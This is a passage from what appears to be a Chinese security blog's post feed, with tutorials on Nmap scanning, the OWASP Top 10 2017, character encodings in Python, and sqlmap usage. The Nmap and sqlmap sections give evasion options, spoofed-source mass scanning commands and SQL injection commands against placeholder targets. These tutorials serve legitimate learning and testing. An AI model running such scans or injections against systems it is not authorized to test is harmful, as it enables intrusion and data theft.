URG)的组合都行。Nmap有三种扫描类型利用这一点：Null扫描 (-sN)不设置任何标志位(tcp标志头是0)FIN扫描 (-sF)只设置TCP FIN标志位。Xmas扫描 (-sX)设置FIN，PSH，和URG标志位，就像点亮圣诞树上所有的灯一样。 除了探测报文的标志位不同，这三种扫描在行为上完全一致。 如果收到一个RST报文，该端口被认为是closed(关闭的)，而没有响应则意味着 端口是open|filtered(开放或者被过滤的)。 如果收到ICMP不可到达错误(类型 3，代号 1，2，3，9，10，或者13)，该端口就被标记为filtered被过滤的。 -sA TCP ACK扫描 它不能确定open(开放的)或者 open|filtered(开放或者过滤的))端口。 它用于发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的. 无论此端口是否开放，均会返回RST报文。 --scanflags 定制TCP扫描 指定任意标志位，可以是数字或URG， ACK，PSH， RST，SYN，and FIN 端口说明 -p 指定端口范围 1U:53,111,137,T:21-25,80,139,8080 -F 快速扫描有限端口 在nmap-services文件中 -r 不要按随机顺序扫描端口,默认是随机顺序 服务版本检测 -sV 版本探测 --allports 不为版本探测排除任何端口 --version-intensity &lt;intensity&gt; 版本扫描强度 操作系统探测 -O 启动操作系统检测 --osscan-limit 针对指定目标进行检测 --osscan-guess 无法确定时，进行推测 时间与性能 -T 设置时间模板，最为常用的选项。数值为0-5 防火墙规避Nmap提供了一些方式来绕过IDS的检测。 具体的看手册。 12345678910111213-f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU)-D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys-S &lt;IP_Address&gt;: Spoof source address-e &lt;iface&gt;: Use specified interface-g/--source-port &lt;portnum&gt;: Use given port number--proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP/SOCKS4 proxies--data &lt;hex string&gt;: Append a custom payload to sent packets--data-string &lt;string&gt;: Append a custom ASCII string to sent packets--data-length &lt;num&gt;: Append random data to sent packets--ip-options &lt;options&gt;: Send packets with specified ip options--ttl &lt;val&gt;: Set IP time-to-live field--spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address--badsum: Send packets with a bogus TCP/UDP/SCTP checksum 需要实践才能比较好的理解。 输出方式 -oN &lt;filespec&gt; 标准输出写入文件 -oX &lt;filespec&gt; XML输出 -v 提高输出信息详细度 --packet-trace 跟踪发送和接受的报文 使用技巧 from DEFCON源视频地址 - DEFCON 16 Nmap techniques 生成随机ip地址1nmap -iR 25000000 -sL -n |awk '&#123;print $5&#125;' | sort -n | uniq &gt;! tp; head -120000 tp &gt;! tcp-allports-1M-IPs; rm tp -iR为随机生成ip地址,-sL为列表模式不进行扫描,-n为不进行DNS查找,awk ..输出第5个字段(IP地址字段),sort | uniq用于排序和去重，并将其前12000个写入文件 优化主机发现基于TCP主机发现 -PS : TCP SYN packet -PA : TCP ACK packet 常见的防火墙有两种： 基于状态的(一般会允许SYN packet通过，而ACK packet由于没有对应的连接而被丢弃) 无状态的(另一种会阻值SYN packet到特定端口，而这种无状态的不知道是否有连接从而让ACK packet通过） 由此可以探查服务器防火墙是什么类型的: 12nmap -sP -PS80 -n example.comnmap -sP -PA80 -n example.com 基于UDP主机发现 -PU : UDP packet 对于UDP端口，open的UDP端口一般是不会回复UDP探针的，而只有close的UDP端口会返回port unreachable packet 基于ICMP的主机发现 -PE : ICMP echo request 回显请求 -PP : ICMP timestap request 用于同步时间 -PM : ICMP netmask request 用于无盘系统获取子网掩码 有些管理员只关闭了echo request可以使用其他的两种，或者混合使用 一些技巧1nmap -sP -PE -PP -PS 21,22,23,25,80,113,31339 -PA 80,113,443,10042 –source-port 53 -T4 -iL 5k_file 这是展示的一个扫描技巧的例子，混合使用了多种request –source-port 53 该端口是DNS查询端口，一般的防火墙都允许来自此端口的数据包 --version-intensity 0 轻量的版本检测会提升很大的速度 --top-ports &lt;number&gt; 使用最常用的number个端口进行扫描 --top-ports 1000能覆盖93%的端口 --top-ports 3674 能覆盖100%的端口 最可能开放的TCP端口: 1234567891080 (http)23 (telnet)22 (ssh)443 (https)3389 (ms-term-serv)445 (microsoft-ds)139 (netbios-ssn)21 (ftp)135 (msrpc)25 (smtp) 最可能开放的UDP端口: 12345678910137 (netbios-ns)161 (snmp)1434 (ms-sql-m)123 (ntp)138 (netbios-dgm)445 (microsoft-ds)135 (msrpc)67 (dhcps)139 (netbios-ssn)53 (domain) 一个完整的扫描命令： 1nmap -S [srcip] -d –max-scan-delay 10 -oAlogs/tcp-allports-%T-%D -iL tcp-allports-1M-IPs –max-retries 1–randomize-hosts -p- -PS21,22,23,25,53,80,443 -T4 –min-hostgroup 256 –min-rate175 –max-rate 300 其中-S [srcip] 为伪造源IP地址，-d为输出日志信息，–max-scan-delay为最大扫描时延，防止有些等待太久，oAlogs/tcp-allports-%T-%D用于以xml格式输出%T表示扫描时间，%D表示扫描日期，–randomize-hosts，因为文件中的IP已经排序，这里将之打乱，避免被防火墙检查出. 1nmap -sV -p 80 -T4 –script http*,default scanme.nmap.org 一个扫描web站点的命令]]></content>
      <categories>
        <category>scanning</category>
      </categories>
      <tags>
        <tag>nmap</tag>
        <tag>scanning</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OWASP TOP10 2017]]></title>
    <url>%2Fblog%2Fowsap-2017-top10%2F</url>
    <content type="text"><![CDATA[开源Web应用安全项目（OWASP）是一个开放的社区， 致力于帮助各企业组织开发、购买和维护可信任的应用程序。Top 10项目的目标，是通过识别出企业组织所面对最严重的风险来提高人们对应用程序安全的意识。 TOP 10 内容如下： 注入 失效的身份认证和会话管理 跨站脚本(XSS) 失效的访问控制 安全配置错误 敏感信息泄露 攻击检测与防护不足 跨站请求伪造(CSRF) 使用含有已知漏洞的组件 未受有效保护的API 注入注入攻击漏洞， 例如SQL，OS以及LDAP注入。这些攻击发生在当不可信的数据作为命 令或者查询语句的一部分，被发送给解释器的时候。攻击者发送的恶意数据可以欺骗解释器，以执行计划外的命令或者在未被恰当授权时访问数据。 注入有很多种，其核心原理都是因为将用户的输入作为可信内容，随业务逻辑一同运行，导致恶意代码写入，造成意想不到的危害 常见的注入有SQL注入，XSS注入，XPATH注入，XML注入，代码注入，命令注入、模板注入等 以SQL注入为例，这里做了详细的阐述。，其余注入可以在文章中搜到，在这里不一一列出。 失效的身份认证和会话管理与身份认证和回话管理相关的应用程序功能往往得不到正确的实现，这就导致了攻击 者攻击者破坏密码、密钥、会话令牌或攻击其他的漏洞去冒充其他用户的身份（暂时或永久的）。 跨站脚本(XSS)当应用程序收到含有不可信的数据，在没有进行适当的验证和转义的情况下，就将它 发送给一个网页浏览器，或者使用可以创建javaScript脚本的浏览器API利用用户提供的数据 更新现有网页，这就会产生跨站脚本攻击。XSS允许攻击者在受害者的浏览器上执行脚本， 从而劫持用户会话、危害网站或者将用户重定向到恶意网站。 这里对xss做了详细的阐述。 失效的访问控制对于通过认证的用户所能够执行的操作，缺乏有效的限制。攻击者就可以利用这些缺 陷来访问未经授权的功能和/或数据，例如访问其他用户的账户，查看敏感文件，修改其他 用户的数据，更改访问权限等。 安全配置错误好的安全需要对应用程序、框架、应用程序服务器、web服务器、数据库服务器和平 台定义和执行安全配置。由于许多设置的默认值并不是安全的，因此，必须定义、实施和 维护这些设置。此外，所有的软件应该保持及时更新。 敏感信息泄露许多web应用程序和API没有正确保护敏感数据，如财务、医疗保健和PII。攻击者可能 会窃取或篡改此类弱保护的数据，进行信用卡欺骗、身份窃取或其他犯罪行为。敏感数据 应该具有额外的保护，例如在存放或在传输过程中的加密，以及与浏览器交换时进行特殊 的预防措施。 攻击检测与防护不足大多数应用和API缺乏检测、预防和响应手动或自动化攻击的能力。攻击保护措施不限 于基本输入验证，还应具备自动检测、记录和响应，甚至阻止攻击的能力。应用所有者还 应能够快速部署安全补丁以防御攻击。 跨站请求伪造(CSRF)一个跨站请求伪造攻击迫使登录用户的浏览器将伪造的HTTP请求，包括受害者的会话 cookie和所有其他自动填充的身份认证信息，发送到一个存在漏洞的web应用程序。这种攻 击允许攻击迫使受害者的浏览器生成让存在漏洞的应用程序认为是受害者的合法请求的请求。 这里对CSRF做了详细的阐述。 使用含有已知漏洞的组件组件，比如：库文件、框架和其他软件模块，具有与应用程序相同的权限。如果一个 带有漏洞的组件被利用，这种攻击可以促成严重的数据丢失或服务器接管。应用程序和API 使用带有已知漏洞的组件可能会破坏应用程序的防御系统，并使一系列可能的攻击和影响 成为可能。 未受有效保护的API现代应用程序通常涉及丰富的客户端应用程序和API，如：浏览器和移动APP中的 JavaScript，其与某类API(SOAP/XML、REST/JSON、RPC、GWT等）连接。这些API通常是不 受保护的，并且包含许多漏洞。]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web security</tag>
        <tag>owasp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编码相关内容详解]]></title>
    <url>%2Fblog%2Fcoding%2F</url>
    <content type="text"><![CDATA[我们在计算机编程中，经常会遇见输出的字符串不是我们想要的，或者同样的字符串在不同环境中输出却不一致，第一部分主要是搞懂以下这些内容究竟有什么区别： str、Unicode、通用字符集、UTF-8、GBK、烫烫烫 锟斤拷、ASCII、bytes、16进制字符串、字符串的16进制数 Unicode码 与 通用字符集 Unicode（中文：万国码、国际码、统一码、单一码）是计算机科学领域里的一项业界标准。它对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。 Unicode伴随着通用字符集的标准而发展，同时也以书本的形式对外发表。Unicode至今仍在不断增修，每个新版本都加入更多新的字符。目前最新的版本为2017年6月20日公布的10.0.0，已经收录超过十万个字符（第十万个字符在2005年获采纳） Unicode涵盖的数据除了视觉上的字形、编码方法、标准的字符编码外，还包含了字符特性，如大小写字母。 Unicode发展由非营利机构统一码联盟（区别于ISO组织）负责，该机构致力于让Unicode方案取代既有的字符编码方案。因为既有的方案往往空间非常有限，亦不适用于多语环境。 Unicode备受认可，并广泛地应用于电脑软件的国际化与本地化过程。有很多新科技，如可扩展置标语言(Extensible Markup Language，简称：XML)、Java编程语言以及现代的操作系统，都采用Unicode编码。 Unicode wiki 这里可以看到相关的介绍，可以看一下。 通用字符集（英语：Universal Character Set, UCS）是由ISO制定的ISO 10646（或称ISO/IEC 10646）标准所定义的标准字符集。通用字符集的初衷是包括世界上所有字符，那么其他所有字符集的内容都能在通用字符集中找到。它保证了与其他字符集的双向兼容，即，如果你将任何文本字符串翻译到UCS格式，然后再翻译回原编码，你不会丢失任何信息。 UCS包含了已知语言的所有字符。除了拉丁语、希腊语、斯拉夫语、希伯来语、阿拉伯语、亚美尼亚语、格鲁吉亚语，还包括中文、日文、韩文这样的方块文字，UCS还包括大量的图形、印刷、数学、科学符号。 UCS不仅给每个字符分配一个代码，而且赋予了一个正式的名字。表示一个UCS或Unicode值的十六进制数通常在前面加上“U+”，例如“U+0041”代表字符“A”。 根据上面的介绍，我们可以概括的来理解这两个东西。 两者都是一种字符编码方案,即为每一个字符而非字形定义唯一的代码,这个方案是一种标准，只是在计算机科学领域，给某一个字符一个确定的值，例如a的Unicode值为97,0的Unicode值为48,你的Unicode值为20320 Unicode码和通用字符集是两个不同组织出于同样的目的所制定的两套标准，两者相互发展，慢慢的走向一致，因为世界上不需要两套不兼容的字符集。所以两者的字码值是一致的 使用U+XXXX来表示码值为XXXX的字符 两者都是字符编码标准,不是实现标准，即其只考虑字符与代码的一一对应，而不考虑计算机中的具体实现。 统一码的编码方式与ISO 10646的通用字符集概念相对应。目前实际应用的统一码版本对应于UCS-2，使用16位的编码空间。也就是每个字符占用2个字节。这样理论上一共最多可以表示216（即65536）个字符。基本满足各种语言的使用。上述16位统一码字符构成基本多文种平面。基本多文种平面的字符的编码为U+hhhh，其中每个h代表一个十六进制数字，与UCS-2编码完全相同。而其对应的4字节UCS-4编码后两个字节一致，前两个字节则所有位均为0。 最新（但未实际广泛使用）的统一码版本定义了16个辅助平面，两者合起来至少需要占据21位的编码空间，比3字节略少。但事实上辅助平面字符仍然占用4字节编码空间，与UCS-4保持一致。未来版本会扩充到ISO 10646-1实现级别3，即涵盖UCS-4的所有字符。UCS-4是一个更大的尚未填充完全的31位字符集，加上恒为0的首位，共需占据32位，即4字节。理论上最多能表示231个字符，完全可以涵盖一切语言所用的符号。 UTF (Unicode Transformation Format)Unicode的实现方式不同于编码方式。一个字符的Unicode编码是确定的。但是在实际传输过程中，由于不同系统平台的设计不一定一致，以及出于节省空间的目的，对Unicode编码的实现方式有所不同。Unicode的实现方式称为Unicode转换格式（Unicode Transformation Format，简称为UTF） 例如，如果一个仅包含基本7位ASCII字符的Unicode文件，如果每个字符都使用2字节的原Unicode编码传输，其第一字节的8位始终为0。这就造成了比较大的浪费。对于这种情况，可以使用UTF-8编码，这是一种变长编码，它将基本7位ASCII字符仍用7位编码表示，占用一个字节（首位补0）。而遇到与其他Unicode字符混合的情况，将按一定算法转换，每个字符使用1-3个字节编码，并利用首位为0或1进行识别。这样对以7位ASCII字符为主的西文文档就大幅节省了编码长度（具体方案参见UTF-8）。类似的，对未来会出现的需要4个字节的辅助平面字符和其他UCS-4扩充字符，2字节编码的UTF-16也需要通过一定的算法进行转换。 再如，如果直接使用与Unicode编码一致（仅限于BMP字符）的UTF-16编码，由于每个字符占用了两个字节，在麦金塔电脑（Mac）机和个人电脑上，对字节顺序的理解是不一致的。这时同一字节流可能会被解释为不同内容，如某字符为十六进制编码4E59，按两个字节拆分为4E和59，在Mac上读取时是从低字节开始，那么在Mac OS会认为此4E59编码为594E，找到的字符为“奎”，而在Windows上从高字节开始读取，则编码为U+4E59的字符为“乙”。就是说在Windows下以UTF-16编码保存一个字符“乙”，在Mac OS环境下打开会显示成“奎”。此类情况说明UTF-16的编码顺序若不加以人为定义就可能发生混淆，于是在UTF-16编码实现方式中使用了大端序（Big-Endian，简写为UTF-16 BE）、小端序（Little-Endian，简写为UTF-16 LE）的概念，以及可附加的字节顺序记号解决方案，目前在PC机上的Windows系统和Linux系统对于UTF-16编码默认使用UTF-16 LE。（具体方案参见UTF-16） 所以常见的UTF-X系列都是编码方式的实现，没有规定要求必须使用哪种编码方式，但会有一些常见的编码方式，如utf-8、utf-7、utf-16、utf-32 UTF-88-bit Unicode Transformation Format 是一种针对Unicode的可变长度字符编码，也是一种前缀码。它可以用来表示Unicode标准中的任何字符，且其编码中的第一个字节仍与ASCII兼容，这使得原来处理ASCII字符的软件无须或只须做少部分修改，即可继续使用。因此，它逐渐成为电子邮件、网页及其他存储或发送文字的应用中，优先采用的编码。 UTF-8使用一至六个字节为每个字符编码（尽管如此，2003年11月UTF-8被RFC 3629重新规范，只能使用原来Unicode定义的区域，U+0000到U+10FFFF，也就是说最多四个字节） 互联网工程工作小组（IETF）要求所有互联网协议都必须支持UTF-8编码。互联网邮件联盟（IMC）建议所有电子邮件软件都支持UTF-8编码。 UTF-8就是以8位为单元对UCS进行编码，而UTF-8不使用大尾序和小尾序的形式，每个使用UTF-8存储的字符，除了第一个字节外，其余字节的头两个比特都是以”10”开始，使文字处理器能够较快地找出每个字符的开始位置。下面是一个UTF-8编码格式表： 码值位数 码值起始 码值终止 字节数 byte 1 byte 2 byte 3 byte 4 byte 5 byte 6 7 U+0000 U+007F 1 0xxxxxxx 11 U+0080 U+07FF 2 110xxxxx 10xxxxxx 16 U+0800 U+FFFF 3 1110xxxx 10xxxxxx 10xxxxxx 21 U+10000 U+1FFFFF 4 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx 26 U+200000 U+3FFFFFF 5 111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 31 U+4000000 U+7FFFFFFF 6 1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 举个栗子，假设用文本编辑器输入以下内容(mac下默认是utf-8编码格式，win下需要看下记事本编码格式)： 1你好 123abc!@# 以二进制格式打开如下： 我们来分析一下，以你为例： 123456'你'的Unicode码值为 20320 转为16进制 4f60按utf-8编码方式 码值位数为16 所以需要3个字节 前三个字节为E4BDA0我们将其写为2进制格式 看是否正确E4BDA0: 11100100 10111101 101000004F60: 0100 111101 100000 可以发现确实如编码格式所叙述的那样。我们再来看一下后面的字符,例如@: 12'@' Unicode 码 为 64 转为16进制 40发现均为40 也说明了UTf-8在0-127与ASCII保持一致 UTF-716-bit Unicode Transformation Format UTF-7本身并非Unicode的标准之一，即使在目前最新的Unicode 5.0里也仅列出UTF-8、UTF-16和UTF-32。由于在过去SMTP的传输仅能接受7比特的字符，而当时Unicode并无法直接满足既有的SMTP传输限制，在这样地背景下UTF-7被提出。严格来说UTF-7不能算是Unicode所定义的字符集之一，较精确的来说，UTF-7是提供了一种将Unicode转换为7比特US-ASCII字符的转换方式。 有些字符本身可以直接以单一的ASCII字符来呈现。第一个组群被称作direct characters，其中包含了62个数字与英文字母，以及包含了九个符号字符：&#39; ( ) , - . / : ?。这些direct characters被认为可以很安全的直接在文件里呈现。另一个主要的组群称作optional direct characters，其中包含了所有可被打印的字符，这些字符在U+0020～U+007E之间，除了~ \ +和`空白字符以外。这些optional direct characters`的使用虽可减少空间的使用也可增加人的可阅读性，但却会因为一些不良设计的邮件网关而会产生一些错误，导致必须使用额外的转义字符。 空白字符、Tab字符、以及换行字符一般虽也可直接是为单一的ASCII字符来使用，然而，若是邮件中有使用了编码过的字符串，则必须特别注意这些字符有无被使用在其他地方。而加号字符+的一种编码方式可以是+-。其他的字符则必须被编码成UTF-16然后转换为修改的Base64。这些区块的开头会以+符号来标示，结尾则以任何不在Base64里定义的字符来标示。若是在Base64区块之后使用-(连字暨减号)标示为结束的话，则解码器会从下个字符继续解码，反之则用此字符当非Base64的区块的开头继续解码。 UTF-7在现今不太常见，一些CTF题目可能使用这个方式来加密，了解一下就好了。 UTF-1616-bit Unicode Transformation Format 具体可以看UTF-16 wiki，不再赘述 ASCII美国信息交换标准代码7 bit定义了128个字符，其中包括33个无法显示的控制字符和95个可显示的字符 ASCII码要早于Unicode，与其所做的事情是一致的。其局限在于只能显示26个基本拉丁字母、阿拉伯数目字和英式标点符号，因此只能用于显示现代美国英语。虽然有ASCII的扩展版(8bit最高位不为0，又扩展了128个)，但仍然无法满足世界众多种语言。 目前常用的编码，都保留了对ASCII码的兼容，即0-127码值与其ASCII码保持一致。 GBK汉字内码扩展规范中国人那么叼，肯定要开发一套属于自己的编码，于是GBK编码诞生了。这套编码格式为中国程序员带来无数的坑。这个编码是和Unicode兼容的，也就是说映射表是一样的。GBK编码严格使用2字节来表示，因为给中国人使用，汉字和字母足够了。GBK编码范围是0x8140-0xFEFE，即: 123高位时0x81 ～ 0xFE 也就是 1000 0001 － 11111110低位时0x40 ～ 0xFE 也就是 0100 0000 － 11111110但不包括低字节是0x7F的组合。 简单看一下，可以看到GBK高位最高位为1，可以有效与ascii区分，但低位开头却有0100 0000这种，与单个ASCII码值一致，这就造成了发生冲突的可能性。 顺便提一下，GBK编码不像UTF-8，可以通过计算得出一个字符的编码结果，举个栗子： 我们要计算你这个字的UTF-8编码值，之前讲过了，由于你的unicode码值为4f60,然后把其填充进1110xxxx 10xxxxxx 10xxxxxx即可。那么对于GBK编码呢？由于其与Unicode兼容，即也认为你的unicode码值为4f60，然后呢，没有然后了。GBK编码是无法计算的！需要使用GBK编码表进行转换 就是类似下边这个玩意： GBK的内码不是连续的，而且和unicode标准没有必然的关系，所以大部分程序在做转换的时候都是依赖的转换表。 烫烫烫 屯屯屯 锟斤拷烫烫烫 屯屯屯大名鼎鼎的乱码，写过C语言的人没有没遇见过的吧。 这种乱码最常见的地方是Visual Studio里。Visual Studio中，未初始化的栈空间用0xCC填充，而未初始化的堆空间用0xCD填充。而0xCCCC和0xCDCD在中文GB2312编码中分别对应烫字和屯字。 锟斤拷这涉及到UTF-8到GBK编码 的转换 在UTF-8中有一个特殊字符� （Replacement character）其Unicode码值为0xFFFD 其作用是： It is used to indicate problems when a system is unable to render a stream of data to a correct symbol. It is usually seen when the data is invalid and does not match any character. 也就是当前设备无法识别其Unicode或版本过低不认识时，使用这个Unicode码值代替,即用来容错的。因为随着UCS标准的更新，之前的设备并不能及时有效的更新。我们用utf-8编码实现以下，填充进1110xxxx 10xxxxxx 10xxxxxx中得到0xEF 0xBF 0xBD,那么如果多个无法识别的字符连续出现，其编码后的值如下格式: 10xEF 0xBF 0xBD 0xEF 0xBF 0xBD 0xEF 0xBF 0xBD ... 那么如果有人并不知道其使用的是utf-8编码格式，而直接将其用GBK编码打开，即被解析为0xEFBF 0xBDEF 0xBFBD ...这三个汉字，而这三个汉字，正是： 123锟（0xEFBF）斤（0xBDEF）拷（0xBFBD） str、bytes、unicode字符串、16进制数、16进制字符串等相互转换以下内容均以python为例 字符编码在平常编写程序过程中，经常会遇见对于字符串处理时，所要求的参数不正确，举个例子： 12345# 求MD5值：import hashlibs = 'abc'md5 = hashlib.md5(s).hexdigest() 我们觉得应该能得到结果，但会抛出 1TypeError: Unicode-objects must be encoded before hashing 查看这个函数会发现，You can now feed this object with bytes-like objects (normally bytes)即其要求一个bytes-like objects，改为： 1hashlib.md5(s.encode('utf-8')).hexdigest() 即可。还有例如接收服务器字符串时有时候是unicode字符串，发现在调用函数时，需要传递一个str字符串，他们之间的转换也是一个常见的问题。再例如在你想在终端中打印你想看到的字符串，但却发现显示是\x40\x45\x46...等内容，更多的情景不再赘述。 首先摔个锅，python2.x关于字符编码方面非常混乱，导致使用的时候容易出错，再加上从2.x到3.x的迁移，python3.x的设计好很多，但是相同名称的类表示不同的含义，往往会造成不深入了解的人们很大的误会。我们来看下2.x和3.x对字符串的处理： python2.x 关键字 含义及说明 str 某种编码类型编码后的字符串UTF-8、GBK等 取决于python文件本身保存的编码格式类似# -*- coding: utf-8 -*-)这种 unicode unicode类型字符串 直接u&#39;abc&#39;或者unicode() python3.x 关键字 含义及说明 bytes 某种编码类型编码后的字符串UTF-8、GBK等 b&#39;abc&#39;例如中文你 utf8编码后的b&#39;\xe4\xbd\xa0&#39; str unicode类型字符串 直接&#39;&#39;就是unicode类型字符串 我们来做一个分析：发现不同版本都有2个类型，一个是unicode类型字符串，一个是用某种编码编码后的字符串，而2.x和3.x同样是str却代表了不同的含义，这使得在版本迁移的时候，如果不看文档，很容易误以为是一样的。 unicode字符串是一个基准，它用2字节来存储字符串每个字符的unicode码值，这样在不同环境中迁移时才能保持一致。某种编码类型编码后的字符串是使用编码方式之后的存储方式。两者类似unicode码和utf-8值一样。 python2.x 12345678910111213&gt;&gt;&gt; type('abc')&lt;type 'str'&gt;&gt;&gt;&gt; type(u'abc')&lt;type 'unicode'&gt;&gt;&gt;&gt; 'str'.decode('utf-8')u'str'&gt;&gt;&gt; print '\xe4\xbd\xa0'你&gt;&gt;&gt; print u'\xe4\xbd\xa0'ä½&gt;&gt;&gt; '\xe4\xbd\xa0'.decode('utf-8')u'\u4f60' python3.x 123456789101112131415&gt;&gt;&gt; type('你')&lt;class 'str'&gt;&gt;&gt;&gt; type(u'你')&lt;class 'str'&gt;&gt;&gt;&gt; '你'.encode('utf-8')b'\xe4\xbd\xa0'&gt;&gt;&gt; b'\xe4\xbd\xa0'.decode('utf-8')'你'&gt;&gt;&gt; '你'.encode('gbk')b'\xc4\xe3'&gt;&gt;&gt; '你'.encode('ascii')Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;UnicodeEncodeError: 'ascii' codec can't encode character '\u4f60' in position 0: ordinal not in range(128) 我相信上面的讲解和例子足以让你完全弄明白字符串的编解码。在python3.x中，还有一个bytearray，如字面意思，byte数组: 123456789101112131415&gt;&gt;&gt; a = bytearray(b'\xe4\xbd\xa0')&gt;&gt;&gt; abytearray(b'\xe4\xbd\xa0')&gt;&gt;&gt; a[0]228&gt;&gt;&gt; a[1]189&gt;&gt;&gt; a = bytearray('好',encoding='utf-8')&gt;&gt;&gt; abytearray(b'\xe5\xa5\xbd')&gt;&gt;&gt; a = bytearray('好')Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;TypeError: string argument without an encoding 我相信你能够很容易理解它。 16进制数转换经常遇见16进制原始字符串或者16进制数表示一个字符串的情况，其实就是字符串bytes格式去掉相关的\x等内容。 1234'你好abc'E4BDA0E5A5BD6162630xE4BDA0E5A5BD616263'E4BDA0E5A5BD616263' 在某些语言中可以使用这种16进制数或字符串来表示一个字符串，在python中，相关的转换可以使用binascii模块或者hex 编码来实现 12345678910111213141516&gt;&gt;&gt; import binascii&gt;&gt;&gt;&gt;&gt;&gt; binascii.b2a_hex('你好abc123'.encode('utf-8'))b'e4bda0e5a5bd616263313233'&gt;&gt;&gt; binascii.hexlify('你好abc123'.encode('utf-8'))b'e4bda0e5a5bd616263313233'&gt;&gt;&gt; binascii.b2a_hex('你好abc123'.encode('utf-8')).upper()b'E4BDA0E5A5BD616263313233'&gt;&gt;&gt; '你好abc123'.encode('utf-8').hex()'e4bda0e5a5bd616263313233'&gt;&gt;&gt; binascii.a2b_hex(b'e4bda0e5a5bd616263')b'\xe4\xbd\xa0\xe5\xa5\xbdabc'&gt;&gt;&gt; binascii.unhexlify(b'e4bda0e5a5bd616263')b'\xe4\xbd\xa0\xe5\xa5\xbdabc']]></content>
      <categories>
        <category>encode&amp;decode</category>
      </categories>
      <tags>
        <tag>coding</tag>
        <tag>encode&amp;decode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap 使用指南]]></title>
    <url>%2Fblog%2Fsqlmap%2F</url>
    <content type="text"><![CDATA[sqlmap的作用: 判断可注入的参数 判断可以用那种SQL注入技术来注入 识别出哪种数据库 根据用户选择，读取哪些数据 其支持5种模式的注入方式: 基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 联合查询注入，可以使用union的情况下的注入。 堆查询注入，可以同时执行多条语句的执行时的注入。 使用-h -hh可看到更为详细的帮助。 测试的来源可以是一个简单的URL，Burp或WebScarab请求日志文件，文本文档中的完整http请求或者Google的搜索，匹配出结果页面，也可以自己定义一个正则来判断那个地址去测试。 测试GET参数，POST参数，HTTP Cookie参数，HTTP User-Agent头和HTTP Referer头来确认是否有SQL注入，它也可以指定用逗号分隔的列表的具体参数来测试。 sqlmap输出共有七个等级,默认为1,使用-v参数更改: 123456789101112130、只显示python错误以及严重的信息。1、同时显示基本信息和警告信息。（默认）2、同时显示debug信息。3、同时显示注入的payload。4、同时显示HTTP请求。5、同时显示HTTP响应头。6、同时显示HTTP响应页面。 我们以-hh显示的参数来介绍常见参数: 参数介绍target/目标目标URL-u 1python sqlmap.py -u "http://www.target.com/vuln.php?id=1" -f --banner --dbs --users Burp或者WebScarab代理中获取日志-l 可以直接吧Burp proxy或者WebScarab proxy中的日志直接倒出来交给sqlmap来一个一个检测是否有注入。 文本中获取多个目标扫描 -m 文件中每行存储一个目标 123www.target1.com/vuln1.php?q=foobarwww.target2.com/vuln2.asp?id=1www.target3.com/vuln3/id/1* 文件中加载HTTP请求-r sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等） 12345POST /vuln.php HTTP/1.1Host: www.target.comUser-Agent: Mozilla/4.0id=1 处理google搜索结果-g sqlmap可以测试注入Google的搜索结果中的GET参数 1python sqlmap.py -g "inurl:\".php?id=1\"" 根据配置文件处理-c 根据ini文件中的内容进行配置 Request/请求http方法--method 更改http请求方法类型，如put,connect等 http数据--data此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。 1python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1" -f --banner --dbs --users 参数拆分字符--param-del当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。 1python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1" --param-del=";" -f --banner --dbs --users HTTP cookie头--cookie,--load-cookies,--drop-set-cookie 这个参数在以下两个方面很有用： web应用需要登陆的时候。 你想要在这些头参数中测试SQL注入时。 可以通过抓包把cookie获取到，复制出来，然后加到–cookie参数里。 在HTTP请求中，遇到Set-Cookie的话，sqlmap会自动获取并且在以后的请求中加入，并且会尝试SQL注入。 如果你不想接受Set-Cookie可以使用--drop-set-cookie参数来拒接。 当你使用--cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。当--level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数。 HTTP User-Agent头--user-agent,--random-agent 默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)可以使用--user-anget参数来修改，同时也可以使用--random-agnet参数来随机的从./txt/user-agents.txt中获取。 当--level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。 HTTP Referer头--referer sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入。有些WAF会限制链接的跳转源，这时修改此字段就非常有必要。 额外的HTTP头--headers 可以通过此参数来增加额外的http头 HTTP请求延迟--delay 可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。 设定超时时间--timeout可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。 利用正则过滤目标网址--scope 1python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)" 避免过多的错误请求被屏蔽--safe-url,--safe-freq 有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。1、–safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。2、–safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。 